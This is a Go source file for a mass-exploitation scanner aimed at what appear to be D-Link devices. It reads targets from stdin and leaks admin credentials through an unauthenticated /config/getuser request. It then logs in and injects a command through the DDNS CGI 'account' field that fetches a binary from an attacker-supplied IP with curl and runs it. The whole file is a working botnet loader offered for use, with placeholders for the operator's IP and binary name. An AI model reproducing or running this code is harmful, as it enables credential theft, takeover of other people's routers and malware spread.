package main

import (
    "net"
    "time"
    "bufio"
    "fmt"
    "os"
    "sync"
	"unicode"
    "strings"
	"encoding/base64"
)

var statusAttempted, statusLogins, statusFound, statusVuln, statusClean int

var CONNECT_TIMEOUT time.Duration = 30
var READ_TIMEOUT time.Duration = 15
var READ_2_TIMEOUT time.Duration = 5

var WRITE_TIMEOUT time.Duration = 10

var syncWait sync.WaitGroup 

var payload string = "curl%20 PUT YOUR IP HERE WITHOUT SPACES%2FBINS NAME HERE WITHOUT SPACES%3Bsh%20 BINS NAME HERE WITHOUT SPACES"

func zeroByte(a []byte) {
    for i := 0; i < len(a); i++ {
		a[i] = 0x00
    }
}

func stipByte(a []byte) {
    for i := 0; i < len(a); i++ {
		if a[i] == 0x0D || a[i] == 0x0A {
			a[i] = 0x00
		}
    }
}


func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func getStringInBetween(str string, start string, end string) (result string) {

    s := strings.Index(str, start)
    if s == -1 {
        return
    }

    s += len(start)
    e := strings.Index(str, end)

    if (s > 0 && e > s + 1) {
        return str[s:e]
    } else {
        return "null"
    }
}

func processTarget(target string) {

    statusAttempted++

    conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
    if err != nil {
        syncWait.Done()
        return
    }

    setWriteTimeout(conn, WRITE_TIMEOUT)
    conn.Write([]byte("GET /config/getuser?index=0 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

    setReadTimeout(conn, READ_TIMEOUT)
    bytebuf := make([]byte, 512)
    l, err := conn.Read(bytebuf)
    if err != nil || l <= 0 {
        zeroByte(bytebuf)
        conn.Close()
		syncWait.Done()
        return
    }

	stipByte(bytebuf)
	conn.Close()

    if strings.Contains(string(bytebuf), "name=") && strings.Contains(string(bytebuf), "pass=") && strings.Contains(string(bytebuf), "priv=") {
        statusFound++
    } else {
        zeroByte(bytebuf)
		syncWait.Done()
        return
    }


	usernameIn := getStringInBetween(string(bytebuf), "name=", "pass=")
	passwordIn := getStringInBetween(string(bytebuf), "pass=", "priv=")

	username := strings.Map(func(r rune) rune {
		if unicode.IsGraphic(r) {
			return r
		}
		return -1
	}, usernameIn)


	password := strings.Map(func(r rune) rune {
		if unicode.IsGraphic(r) {
			return r
		}
		return -1
	}, passwordIn)

	if len(username) <= 0 || len(password) <= 0 {
	    zeroByte(bytebuf)
		syncWait.Done()
        return
	} else {
		zeroByte(bytebuf)
		statusLogins++
	}

	b64auth := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))

	conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
    if err != nil {
        syncWait.Done()
        return
    }

    setWriteTimeout(conn, WRITE_TIMEOUT)
    conn.Write([]byte("GET /cgi-bin/ddns_enc.cgi?enable=1&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=;" + payload + "; HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Basic " + b64auth + "\r\n\r\n"))

    setReadTimeout(conn, READ_TIMEOUT)
    l, err = conn.Read(bytebuf)
    if err != nil || l <= 0 {
        zeroByte(bytebuf)
        conn.Close()
		syncWait.Done()
        return
    }

	conn.Close()
	time.Sleep(15 * time.Second)

	conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT * time.Second)
    if err != nil {
        syncWait.Done()
        return
    }

    setWriteTimeout(conn, WRITE_TIMEOUT)
    conn.Write([]byte("GET /cgi-bin/ddns_enc.cgi?enable=0&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=aaaa HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Basic " + b64auth + "\r\n\r\n"))

    setReadTimeout(conn, READ_TIMEOUT)
    l, err = conn.Read(bytebuf)
    if err != nil || l <= 0 {
        zeroByte(bytebuf)
        conn.Close()
		syncWait.Done()
        return
    }

	if strings.Contains(string(bytebuf), "service=www.dlinkddns.com") {
		statusVuln++
	}

	conn.Close()
    syncWait.Done()
    return

}

func main() {

	var i int = 0

    if (len(os.Args) != 2) {
        fmt.Println("[Scanner] Missing argument (port/listen)")
        return
    }

	go func() {
        i = 0
		for {
			fmt.Printf("%d's | Total %d | Device Found: %d | Authenticated: %d | Payload Sent: %d\r\n", i, statusAttempted, statusFound, statusLogins, statusVuln)
			time.Sleep(1 * time.Second)
			i++
		}
	} ()

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            if os.Args[1] == "listen" {
        		go processTarget(scan.Text())
        	} else {
        		go processTarget(scan.Text() + ":" + os.Args[1])
        	}
            syncWait.Add(1)
        }
    }
}
